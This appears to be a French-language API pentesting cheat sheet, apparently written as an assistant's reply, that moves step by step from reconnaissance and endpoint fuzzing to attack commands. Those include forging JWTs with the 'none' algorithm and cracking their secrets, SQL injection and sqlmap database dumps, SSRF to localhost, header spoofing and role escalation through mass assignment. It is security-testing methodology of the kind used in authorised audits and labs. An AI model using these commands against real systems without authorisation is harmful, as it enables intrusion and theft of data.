Voici le carnet complet pour auditer une API :

---

**1. Reconnaissance**

```bash
# Identifier la technologie
curl -I https://IP/api/
# Chercher documentation exposée
/api/docs
/api/swagger
/swagger.json
/openapi.json
/api/v1/docs
/graphql
/graphiql
```

**2. Enumération des endpoints**

```bash
# Gobuster avec wordlist API
gobuster dir -u http://IP/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt -x json

# Wordlists spécifiques API
/usr/share/wordlists/seclists/Discovery/Web-Content/api/
/usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

# Tester les versions
/api/v1/
/api/v2/
/api/v3/

# Tester les méthodes HTTP sur chaque endpoint
curl -X GET /api/users
curl -X POST /api/users
curl -X PUT /api/users
curl -X DELETE /api/users
curl -X PATCH /api/users
curl -X OPTIONS /api/users
```

**3. Authentification**

```bash
# Tester sans token
curl http://IP/api/users

# Tester avec token JWT
curl -H "Authorization: Bearer TOKEN" http://IP/api/users

# Analyser un JWT
# header.payload.signature en base64
echo "payload_base64" | base64 -d

# Tester JWT none algorithm
# Modifier header: {"alg":"none","typ":"JWT"}
# Supprimer la signature

# Tester JWT secret faible
hashcat -a 0 -m 16500 JWT /usr/share/wordlists/rockyou.txt
```

**4. Tests de vulnérabilités**

```bash
# IDOR (Insecure Direct Object Reference)
# Changer l'ID dans l'URL
/api/users/1 → /api/users/2
/api/users/me → /api/users/admin

# Mass Assignment
# Envoyer des champs non attendus
curl -X POST /api/users -d '{"username":"test","role":"admin"}'

# SQLi dans paramètres API
curl /api/users?id=1'
curl /api/users?id=1 OR 1=1--

# SSRF
curl -X POST /api/fetch -d '{"url":"http://127.0.0.1/admin"}'

# Injection dans headers
curl -H "X-Forwarded-For: 127.0.0.1" /api/admin
curl -H "X-Original-IP: 127.0.0.1" /api/admin
```

**5. Outils**

```bash
# Arjun — découverte de paramètres cachés
arjun -u http://IP/api/endpoint

# ffuf — fuzzing endpoints et paramètres
ffuf -u http://IP/api/FUZZ -w wordlist.txt
ffuf -u http://IP/api/users?FUZZ=test -w params.txt

# Postman/Insomnia — tester manuellement les requêtes

# jwt_tool — attaques JWT
jwt_tool TOKEN -T
jwt_tool TOKEN -X a  # none algorithm
jwt_tool TOKEN -C -d rockyou.txt  # crack secret

# sqlmap sur API
sqlmap -u "http://IP/api/users?id=1" --dbs
sqlmap -u "http://IP/api/users" --data='{"id":"1"}' --dbms=mysql
```

**6. Process complet**

```
1. curl -I → identifier technologie/version
2. Chercher /docs /swagger /openapi.json
3. Gobuster avec wordlist API sur /api/
4. Tester chaque endpoint trouvé avec GET/POST/PUT/DELETE
5. Chercher endpoints sans auth
6. Si JWT → analyser + tester none/crack
7. Tester IDOR sur chaque ID
8. Tester mass assignment sur POST/PUT
9. Tester SQLi/SSRF sur paramètres
10. Arjun sur chaque endpoint pour paramètres cachés
```

**7. Wordlists API essentielles**

```bash
/usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/api/actions.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
```

---
